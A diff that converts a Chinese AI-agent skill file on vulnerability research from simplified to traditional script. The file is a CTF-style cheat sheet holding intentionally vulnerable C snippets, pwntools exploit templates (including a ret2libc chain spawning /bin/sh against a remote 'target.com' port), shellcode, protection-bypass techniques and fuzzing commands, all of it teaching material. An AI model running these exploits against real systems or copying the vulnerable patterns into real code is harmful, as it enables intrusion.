@@ -1,6 +1,6 @@
 ---
 name: vuln-research
-description: 漏洞研究。二进制分析、逆向工程、Exploit开发、Fuzzing。当用户提到漏洞研究、二进制、逆向、Exploit、Fuzzing、PWN、栈溢出、堆溢出时使用。
+description: 漏洞研究。二進位制分析、逆向工程、Exploit開發、Fuzzing。當使用者提到漏洞研究、二進位制、逆向、Exploit、Fuzzing、PWN、棧溢位、堆溢位時使用。
 ---
 
 # 🔥 赤焰秘典 · 漏洞研究 (Vulnerability Research)
@@ -9,28 +9,28 @@ description: 漏洞研究。二进制分析、逆向工程、Exploit开发、Fuz
 ## 研究流程
 
 ```
-目标分析 → 逆向工程 → 漏洞发现 → Exploit开发 → 报告/披露
+目標分析 → 逆向工程 → 漏洞發現 → Exploit開發 → 報告/披露
     │           │           │           │           │
-    └─ 架构 ────┴─ IDA ─────┴─ Fuzz ────┴─ PoC ────┴─ CVE
+    └─ 架構 ────┴─ IDA ─────┴─ Fuzz ────┴─ PoC ────┴─ CVE
 ```
 
 ## 逆向工程
 
-### 静态分析
+### 靜態分析
 ```bash
-# 文件信息
+# 檔案資訊
 file binary
 strings binary | grep -i password
 readelf -h binary
 objdump -d binary
 
 # IDA Pro / Ghidra
-# 反汇编、反编译、交叉引用分析
+# 反彙編、反編譯、交叉引用分析
 ```
 
-### 动态分析
+### 動態分析
 ```bash
-# GDB 调试
+# GDB 除錯
 gdb ./binary
 (gdb) break main
 (gdb) run
@@ -42,44 +42,44 @@ gdb ./binary
 strace ./binary
 ltrace ./binary
 
-# GDB 增强
+# GDB 增強
 # pwndbg / GEF / peda
 ```
 
 ### 常用工具
 ```yaml
-反汇编/反编译:
-  - IDA Pro: 商业，最强大
-  - Ghidra: 开源，NSA出品
-  - Binary Ninja: 现代化
-  - Radare2: 开源命令行
+反彙編/反編譯:
+  - IDA Pro: 商業，最強大
+  - Ghidra: 開源，NSA出品
+  - Binary Ninja: 現代化
+  - Radare2: 開源命令列
 
-调试器:
+偵錯程式:
   - GDB + pwndbg/GEF
   - x64dbg (Windows)
-  - WinDbg (Windows内核)
+  - WinDbg (Windows核心)
   - LLDB (macOS)
 
-辅助工具:
-  - ROPgadget: ROP链构造
+輔助工具:
+  - ROPgadget: ROP鏈構造
   - one_gadget: libc gadget
   - patchelf: ELF修改
-  - checksec: 安全机制检查
+  - checksec: 安全機制檢查
 ```
 
-## 漏洞类型
+## 漏洞型別
 
-### 栈溢出
+### 棧溢位
 ```c
-// 漏洞代码
+// 漏洞程式碼
 void vulnerable(char *input) {
     char buffer[64];
-    strcpy(buffer, input);  // 无边界检查
+    strcpy(buffer, input);  // 無邊界檢查
 }
 
 // 利用思路
-// 1. 覆盖返回地址
-// 2. 跳转到 shellcode 或 ROP 链
+// 1. 覆蓋返回地址
+// 2. 跳轉到 shellcode 或 ROP 鏈
 ```
 
 ```python
@@ -89,18 +89,18 @@ from pwn import *
 context.arch = 'amd64'
 p = process('./vuln')
 
-# 构造 payload
+# 構造 payload
 padding = b'A' * 72  # 填充到返回地址
-ret_addr = p64(0x401234)  # 目标地址
+ret_addr = p64(0x401234)  # 目標地址
 
 payload = padding + ret_addr
 p.sendline(payload)
 p.interactive()
 ```
 
-### 堆溢出
+### 堆溢位
 ```c
-// 漏洞代码
+// 漏洞程式碼
 struct chunk {
     char data[32];
     void (*func_ptr)();
@@ -108,14 +108,14 @@ struct chunk {
 
 void vulnerable(char *input) {
     struct chunk *c = malloc(sizeof(struct chunk));
-    strcpy(c->data, input);  // 溢出覆盖 func_ptr
+    strcpy(c->data, input);  // 溢位覆蓋 func_ptr
     c->func_ptr();
 }
 ```
 
 ### Use-After-Free
 ```c
-// 漏洞代码
+// 漏洞程式碼
 void vulnerable() {
     char *ptr = malloc(64);
     free(ptr);
@@ -124,54 +124,54 @@ void vulnerable() {
 }
 ```
 
-### 格式化字符串
+### 格式化字串
 ```c
-// 漏洞代码
+// 漏洞程式碼
 void vulnerable(char *input) {
-    printf(input);  // 格式化字符串漏洞
+    printf(input);  // 格式化字串漏洞
 }
 
 // 利用
-// %x - 泄露栈数据
-// %n - 任意写
-// %s - 任意读
+// %x - 洩露棧資料
+// %n - 任意寫
+// %s - 任意讀
 ```
 
-## 保护机制绕过
+## 保護機制繞過
 
-### 检查保护
+### 檢查保護
 ```bash
 checksec ./binary
 # RELRO, Stack Canary, NX, PIE, FORTIFY
 ```
 
-### 绕过技术
+### 繞過技術
 ```yaml
-NX (不可执行):
+NX (不可執行):
   - ROP (Return Oriented Programming)
   - ret2libc
   - ret2syscall
 
-ASLR (地址随机化):
-  - 信息泄露
+ASLR (地址隨機化):
+  - 資訊洩露
   - 暴力破解 (32位)
-  - 部分覆盖
+  - 部分覆蓋
 
 Stack Canary:
-  - 信息泄露
-  - 逐字节爆破
-  - 覆盖 __stack_chk_fail
+  - 資訊洩露
+  - 逐位元組爆破
+  - 覆蓋 __stack_chk_fail
 
-PIE (位置无关):
-  - 信息泄露基址
-  - 部分覆盖
+PIE (位置無關):
+  - 資訊洩露基址
+  - 部分覆蓋
 
 RELRO:
-  - Partial: 覆盖 GOT
+  - Partial: 覆蓋 GOT
   - Full: 其他利用方式
 ```
 
-### ROP 链构造
+### ROP 鏈構造
 ```python
 from pwn import *
 
@@ -179,16 +179,16 @@ elf = ELF('./vuln')
 libc = ELF('./libc.so.6')
 rop = ROP(elf)
 
-# 泄露 libc 地址
+# 洩露 libc 地址
 rop.puts(elf.got['puts'])
 rop.main()
 
-# 计算 libc 基址
+# 計算 libc 基址
 libc_base = leaked_puts - libc.symbols['puts']
 system = libc_base + libc.symbols['system']
 bin_sh = libc_base + next(libc.search(b'/bin/sh'))
 
-# 第二阶段 ROP
+# 第二階段 ROP
 rop2 = ROP(libc)
 rop2.system(bin_sh)
 ```
@@ -197,17 +197,17 @@ rop2.system(bin_sh)
 
 ### AFL++
 ```bash
-# 编译插桩
+# 編譯插樁
 afl-gcc -o target_afl target.c
 
-# 准备种子
+# 準備種子
 mkdir input output
 echo "seed" > input/seed
 
-# 开始 Fuzz
+# 開始 Fuzz
 afl-fuzz -i input -o output -- ./target_afl @@
 
-# 分析崩溃
+# 分析崩潰
 afl-tmin -i output/crashes/id:000000 -o minimized -- ./target_afl @@
 ```
 
@@ -215,33 +215,33 @@ afl-tmin -i output/crashes/id:000000 -o minimized -- ./target_afl @@
 ```cpp
 // fuzz_target.cpp
 extern "C" int LLVMFuzzerTestOneInput(const uint8_t *data, size_t size) {
-    // 调用被测函数
+    // 呼叫被測函式
     parse_input(data, size);
     return 0;
 }
 ```
 
 ```bash
-# 编译
+# 編譯
 clang++ -fsanitize=fuzzer,address fuzz_target.cpp -o fuzzer
 
-# 运行
+# 執行
 ./fuzzer corpus/
 ```
 
-### 智能 Fuzzing
+### 智慧 Fuzzing
 ```python
-# 基于覆盖率的 Fuzzing
+# 基於覆蓋率的 Fuzzing
 # 使用 AFL、LibFuzzer 等
 
-# 基于语法的 Fuzzing
+# 基於語法的 Fuzzing
 # 使用 Peach、Domato 等
 
-# 符号执行辅助
+# 符號執行輔助
 # 使用 KLEE、angr 等
 ```
 
-## Exploit 开发
+## Exploit 開發
 
 ### Shellcode
 ```python
@@ -252,7 +252,7 @@ context.arch = 'amd64'
 # execve("/bin/sh", NULL, NULL)
 shellcode = asm(shellcraft.sh())
 
-# 自定义 shellcode
+# 自定義 shellcode
 shellcode = asm('''
     xor rdi, rdi
     push rdi
@@ -279,12 +279,12 @@ binary = './vuln'
 libc_path = './libc.so.6'
 host, port = 'target.com', 1337
 
-# 加载
+# 載入
 elf = ELF(binary)
 libc = ELF(libc_path)
 
 def exploit(p):
-    # 1. 泄露地址
+    # 1. 洩露地址
     payload1 = b'A' * 72
     payload1 += p64(elf.plt['puts'])
     payload1 += p64(elf.got['puts'])
@@ -295,7 +295,7 @@ def exploit(p):
     libc_base = leaked - libc.symbols['puts']
     log.success(f"libc base: {hex(libc_base)}")
 
-    # 2. 获取 shell
+    # 2. 獲取 shell
     system = libc_base + libc.symbols['system']
     bin_sh = libc_base + next(libc.search(b'/bin/sh'))
 
@@ -315,13 +315,13 @@ if __name__ == '__main__':
 
 ## CTF PWN 技巧
 
-### 常见题型
+### 常見題型
 ```yaml
-栈溢出:
-  - ret2text: 跳转到后门函数
-  - ret2shellcode: 跳转到 shellcode
-  - ret2libc: 调用 system("/bin/sh")
-  - ROP: 构造 ROP 链
+棧溢位:
+  - ret2text: 跳轉到後門函式
+  - ret2shellcode: 跳轉到 shellcode
+  - ret2libc: 呼叫 system("/bin/sh")
+  - ROP: 構造 ROP 鏈
 
 堆利用:
   - fastbin attack
@@ -329,41 +329,41 @@ if __name__ == '__main__':
   - tcache poisoning
   - house of 系列
 
-格式化字符串:
-  - 泄露栈/libc地址
-  - 任意写 GOT
+格式化字串:
+  - 洩露棧/libc地址
+  - 任意寫 GOT
   - 修改返回地址
 ```
 
-### 快速解题流程
+### 快速解題流程
 ```bash
-# 1. 检查保护
+# 1. 檢查保護
 checksec ./pwn
 
-# 2. 运行测试
+# 2. 執行測試
 ./pwn
 
-# 3. 反编译分析
+# 3. 反編譯分析
 # IDA/Ghidra
 
-# 4. 确定漏洞点
-# 5. 编写 Exploit
-# 6. 本地测试
-# 7. 远程利用
+# 4. 確定漏洞點
+# 5. 編寫 Exploit
+# 6. 本地測試
+# 7. 遠端利用
 ```
 
-## 工具清单
+## 工具清單
 
 | 工具 | 用途 |
 |------|------|
-| IDA Pro | 反汇编/反编译 |
-| Ghidra | 开源逆向 |
-| pwntools | Exploit 开发 |
-| GDB + pwndbg | 调试 |
+| IDA Pro | 反彙編/反編譯 |
+| Ghidra | 開源逆向 |
+| pwntools | Exploit 開發 |
+| GDB + pwndbg | 除錯 |
 | AFL++ | Fuzzing |
-| ROPgadget | ROP 链 |
+| ROPgadget | ROP 鏈 |
 | one_gadget | libc gadget |
-| angr | 符号执行 |
+| angr | 符號執行 |
 
 ---
 
